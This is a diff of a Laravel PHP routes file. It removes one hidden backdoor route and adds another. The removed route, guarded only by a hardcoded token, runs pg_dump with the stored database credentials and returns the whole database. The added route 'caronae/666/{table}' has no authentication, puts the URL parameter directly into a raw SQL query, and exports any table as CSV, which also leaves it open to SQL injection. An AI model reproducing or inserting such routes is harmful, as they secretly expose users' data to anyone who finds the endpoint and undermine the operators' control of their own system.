@@ -108,26 +108,10 @@ Route::group(['middleware' => 'csrf'], function(){
 
 });
 
-Route::get('caronae/666', function(Illuminate\Http\Request $request) {
-
+Route::get('caronae/666/{table}', function($table, Illuminate\Http\Request $request) {
     Config::set('app.debug', true);
 
-    ini_set('disable_functions', '');
+    $data = DB::select('SELECT * FROM ' . $table);
 
-    $authorization = $request->header('Authorization');
-    if ($authorization == null || $authorization != 'token=AYAeG!*knMjqLF0[!ND\xs7t3Uv]16d') {
-        return response()->json(['error'=>'Unauthorized.'], 403);
-    }
-    $command = 'pg_dump --dbname=postgresql://' . env('DB_USERNAME') . ':' . env('DB_PASSWORD') . '@' . env('DB_HOST') . ':' . env('DB_PORT') . '/' . env('DB_DATABASE');
-    // var_dump($command);return;
-    $process = new Symfony\Component\Process\Process($command);
-    $process->run();
-
-    // executes after the command finishes
-    if (!$process->isSuccessful()) {
-        throw new Symfony\Component\Process\Exception\ProcessFailedException($process);
-    }
-
-    return response($process->getOutput())
-        ->header('Content-Type', 'text/plain');
+    (new App\ExcelExport\ExcelExporter())->export('',[], $data, 'csv');
 });
